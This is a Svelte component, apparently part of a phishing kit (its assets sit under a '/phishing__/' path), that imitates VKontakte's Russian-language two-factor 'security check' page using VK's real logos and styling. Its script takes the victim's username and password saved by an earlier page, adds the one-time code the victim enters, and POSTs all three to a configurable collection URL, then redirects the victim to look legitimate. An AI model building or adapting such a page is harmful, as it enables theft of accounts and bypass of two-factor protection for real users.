<style>
  .background {
    background-color: #edeef0;
    height: 100vh;
    width: 100%;
  }

  @media (min-width: 701px) {
    .otp-form__nav-container {
      width: 100%;
      background-color: #4a76a8;
    }
    .otp-form__nav {
      display: flex;
      justify-content: space-between;
      width: 100%;
      max-width: 600px;
      margin: 0 auto;
      height: 42px;
      line-height: 42px;
      font-size: 12.5px;
      color: #fff;
    }

    .otp-form__nav-logo {
      font-size: 0;
      width: 34px;
      display: block;
      background-image: url(https://vk.com/images/svg_icons/ic_head_logo.svg);
      background-repeat: no-repeat;
      background-position: 0 12px;
    }

    .otp-form__nav-action {
      color: #fff;
      text-decoration: none;
      padding: 0 10px;
      font-weight: bold;
    }

    .otp-form__nav-action:hover,
    .otp-form__nav-action:focus {
      background-color: #0014331f;
    }

    .otp-form__nav-action::before {
      content: "регистрация";
    }

    .otp-form__form {
      max-width: 600px;

      margin: 0 auto;
      margin-top: 20px;
      background-color: #fff;
      overflow: hidden;
      border-radius: 4px;
      box-shadow: 0 1px 0 0 #d3d9de, 0 0 0 1px #e7e8ec;
    }

    .otp-form__form-title {
      margin: 0;
      padding: 0 20px;
      line-height: 55px;
      font-size: 16px;
      font-weight: normal;
      background-color: #fafbfc;
      border-bottom: 1px solid #e7e8ec;
    }
    .otp-form__content {
      padding: 15px 20px 20px;
    }
    .otp-form__form-desc {
      margin: 0;
      padding-bottom: 20px;
    }
    .otp-form__fields {
      width: 140px;
      margin: 0 auto;
    }

    .otp-form__field {
      margin-bottom: 13px;
      display: block;
    }

    .otp-form__label {
      font-weight: bold;
      margin-bottom: 8px;
      color: #222222;
      display: block;
      line-height: 19px;
      font-weight: 500;
    }

    .otp-form__input {
      padding: 5px 9px 7px;
      border-radius: 3px;
      margin: 0;
      border: 1px solid #d3d9de;
      font-size: 13px;
      width: 100%;
    }

    .otp-form__button {
      width: 100%;
      padding: 0 3px;
      margin: 0;
      cursor: pointer;
      text-align: center;
      border-radius: 4px;
      border: none;
    }

    .otp-form__button:hover,
    .otp-form__button:focus {
      opacity: 0.88;
    }

    .otp-form__button--primary {
      padding: 7px 16px 8px;
      background-color: #5181b8;
      color: #fff;
    }

    .otp-form__field--checkbox {
      line-height: 1.27em;
      font-size: 13px;
    }

    .otp-form__checkbox-element {
      clip: rect(0 0 0 0);
      clip-path: inset(50%);
      height: 1px;
      overflow: hidden;
      position: absolute;
      white-space: nowrap;
      width: 1px;
    }
    .otp-form__checkbox-element + .otp-form__checkbox-label::before {
      content: "";
      float: left;

      background: no-repeat 0 center;
      background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg%20height%3D%2215%22%20viewBox%3D%220%200%2015%2015%22%20width%3D%2215%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Crect%20fill%3D%22%23fff%22%20height%3D%2215%22%20rx%3D%223%22%20width%3D%2215%22%2F%3E%3Crect%20height%3D%2214%22%20rx%3D%223%22%20stroke%3D%22%23c1c9d1%22%20width%3D%2214%22%20x%3D%22.5%22%20y%3D%22.5%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E);

      margin: 0 5px 0 0;
      display: block;
      width: 15px;
      height: 15px;
    }

    .otp-form__checkbox-element:checked + .otp-form__checkbox-label::before {
      background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2215%22%20height%3D%2215%22%20viewBox%3D%220%200%2015%2015%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Crect%20width%3D%2215%22%20height%3D%2215%22%20fill%3D%22%235B88BD%22%20rx%3D%223%22%2F%3E%3Cpath%20stroke%3D%22%23FFF%22%20stroke-width%3D%221.7%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%20d%3D%22M4%207.5L6.5%2010%2011%204.5%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E);
    }

    .otp-form__error {
      background: #ffd6cc url(https://vk.com/images/icons/msg_error.png?1)
        no-repeat 12px 12px;
      border: 1px solid #f2ab99;
      padding: 7px 18px 9px 55px;
      border-radius: 2px;

      margin-bottom: 20px;
      min-height: 58px;
      line-height: 150%;
    }
    .otp-form__error-title {
      margin: 0;
    }
    .otp-form__error-title::after {
      content: ".";
      font-weight: normal;
    }
  }

  @media (max-width: 700px) {
    .otp-form__nav-container {
      width: 100%;
      background-color: #fff;
    }
    .otp-form__nav {
      height: 56px;
      line-height: 56px;
      display: flex;
      justify-content: space-between;
      width: 100%;
      max-width: 620px;
      margin: 0 auto;
      padding: 0 8px;
    }
    .otp-form__nav-logo {
      color: #2c2d2e;
      font-size: 20px;
      font-weight: 700;
      padding-left: 45px;
      text-decoration: none;
      position: relative;
    }
    .otp-form__nav-logo::before {
      content: "";
      display: block;
      background-position: -120px -56px;
      background-repeat: no-repeat;
      width: 32px;
      height: 32px;
      background-size: 312px 292px;
      background-image: url(/phishing__/base-c7ea6308.svg);
      position: absolute;
      left: 0;
      top: 11px;
    }
    .otp-form__nav-action {
      color: #2c2d2e;
      text-decoration: none;
      font-weight: 500;
    }
    .otp-form__nav-action:hover,
    .otp-form__nav-action:focus {
      text-decoration: underline;
    }

    .otp-form__nav-action::before {
      content: "выйти";
    }

    .otp-form__form {
      max-width: 620px;
      background-color: #fff;
      margin: 0 auto;
    }
    .otp-form__form-title {
      margin: 0 16px;
      padding: 12px 0;
      font-weight: 500;
      font-size: 13px;
      line-height: 20px;
      text-transform: uppercase;
      color: #6d7885;
    }
    .otp-form__content {
      padding: 0 12px 12px;
    }
    .otp-form__form-desc {
      margin-top: 10px;
      font-size: 15px;
    }

    .otp-form__field {
      padding: 12px 0 0;
      display: block;
    }

    .otp-form__label {
      padding: 0 0 6px;
      color: #818c99;
      font-size: 14px;
      line-height: 18px;
      display: block;
    }

    .otp-form__label::after {
      content: ":";
    }

    .otp-form__input {
      border-radius: 10px;
      font-size: 16px;
      line-height: 20px;
      padding: 11px 12px;
      margin: 0;
      resize: vertical;
      color: #000000;
      border: 1px solid rgba(0, 0, 0, 0.12);
      vertical-align: top;
      width: 100%;
      min-width: 30px;
      background: #f2f3f5;
      transition: border 0.2s;
    }
    .otp-form__input:focus {
      outline: none;
      border-color: #3f8ae0;
    }

    .otp-form__button {
      text-align: center;
      cursor: pointer;
      font-size: 15px;
      font-weight: 500;
      line-height: 16px;
      padding: 10px 16px;
      border-radius: 10px;
      border: none;
    }

    .otp-form__button--primary {
      color: #fff;
      background-color: #4986cc;
    }

    .otp-form__button--submit {
      width: 100%;
    }

    .otp-form__field--checkbox {
      display: block;
      position: relative;
      font-size: 16px;
      line-height: 20px;
      padding: 12px 0 12px 34px;
    }

    .otp-form__checkbox-element {
      clip: rect(0 0 0 0);
      clip-path: inset(50%);
      height: 1px;
      overflow: hidden;
      position: absolute;
      white-space: nowrap;
      width: 1px;
    }

    .otp-form__checkbox-element + .otp-form__checkbox-label::before {
      background-position: -68px -4px;
      background-repeat: no-repeat;
      width: 44px;
      height: 44px;
      display: block;

      background-image: url(/phishing__/base-c7ea6308.svg);
      background-size: 312px 292px;
      content: "";
      left: -12px;
      top: 0;
      position: absolute;
      cursor: pointer;
    }

    .otp-form__checkbox-element:checked + .otp-form__checkbox-label::before {
      background-position: -4px -68px;
    }

    .otp-form__error {
      padding: 14px;
      padding-left: 48px;
      border-radius: 8px;
      background: #fff;
      box-shadow: 0 0 24px 0 rgba(0, 0, 0, 0.3), 0 0 2px 0 rgba(0, 0, 0, 0.08);
      margin: 8px 7px;
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      z-index: 10000;
      user-select: none;
      line-height: 1.33;
      font-size: 15px;
    }

    .otp-form__error::before {
      content: "";
      background-position: -164px -4px;
      background-repeat: no-repeat;
      width: 24px;
      height: 24px;
      display: block;
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      background-size: 192px 152px;
      background-image: url(/phishing__/common-cbde6d07.svg);
    }

    .otp-form__error-title {
      margin: 0;
      font-weight: normal;
    }
    .otp-form__error-title::after {
      content: ".";
    }
  }
</style>

<script>
  import * as ac from "../misc/auth-constants";
  import { onMount, onDestroy } from "svelte";
  import { goto, stores } from "@sapper/app";

  let exitUrl;
  let authUrl;
  let unsub;

  onMount(() => {
    if (
      !localStorage.getItem("username") ||
      !localStorage.getItem("password")
    ) {
      goto("/auth");
    }

    const { session } = stores();

    unsub = session.subscribe(value => {
      exitUrl = value.exit;
      authUrl = value.authUrl;
    });
  });

  onDestroy(() => (typeof unsub === "function" ? unsub() : void 0));

  let inputLock = false;
  let error = "";
  let code = "";
  let saveBrowser = true;

  function auth() {
    inputLock = true;

    const data = {
      code,
      username: localStorage.getItem("username"),
      password: localStorage.getItem("password")
    };

    fetch(authUrl, {
      method: "POST",
      body: JSON.stringify(data),
      headers: {
        "Content-Type": "application/json"
      }
    })
      .then(response => response.json())
      .then(response => {
        switch (response.status) {
          case ac.R_SUCCESS:
            window.location.assign(exitUrl);
            break;
          case ac.R_ERROR_INVALID_CREDENTIALS:
          case ac.R_CAPTCHA:
            goto("/auth");
            break;
          case ac.R_ERROR_INVALID_CODE:
            error = "Пожалуйста, введите код, который Вы только что получили.";
            break;
          default:
            error = "Произошла неизвестная ошибка.";
            break;
        }
      })
      .catch(() => (error = "Произошла сетевая ошибка"))
      .then(() => (inputLock = false))
      .then(() => setInterval(() => (error = ""), 5000));
  }
</script>

<svelte:head>
  <title>Проверка безопасности | ВКонтакте</title>
</svelte:head>

<div class="background">
  <div class="otp-form">
    <div class="otp-form__nav-container">
      <nav class="otp-form__nav">
        <a class="otp-form__nav-logo" href="/">ВКонтакте</a>
        <a href="https://vk.com" rel="external" class="otp-form__nav-action">
          &#13;
        </a>
      </nav>

    </div>
    <form class="otp-form__form" on:submit|preventDefault="{auth}">
      <h1 class="otp-form__form-title">Проверка безопасности</h1>

      <div class="otp-form__content">
        <p class="otp-form__form-desc">
          Пожалуйста, введите
          <b>код</b>
          из личного сообщения от Администрации или из приложения для генерации
          кодов, чтобы подтвердить, что Вы владелец страницы.
        </p>
        {#if error}
          <div class="otp-form__error">
            <h4 class="otp-form__error-title">Ошибка</h4>
            <div class="otp-form__error-desc">{error}</div>
          </div>
        {/if}
        <div class="otp-form__fields">
          <label class="otp-form__field">
            <span class="otp-form__label">Код подтверждения</span>
            <input
              type="text"
              class="otp-form__input"
              bind:value="{code}"
              autocomplete="one-time-code"
              inputmode="numeric"
              placeholder="Введите код"
              disabled="{inputLock}"
              minlength="4"
              maxlength="8"
              pattern="[0-9]+"
            />
          </label>
          <label class="otp-form__field otp-form__field--checkbox">
            <input
              type="checkbox"
              class="otp-form__checkbox-element"
              bind:checked="{saveBrowser}"
              disabled="{inputLock}"
            />
            <span class="otp-form__checkbox-label">Запомнить браузер</span>
          </label>
          <button
            type="submit"
            class="otp-form__button otp-form__button--primary
            otp-form__button--submit"
            disabled="{inputLock}"
          >
            Отправить
          </button>
        </div>
      </div>

    </form>

  </div>
</div>
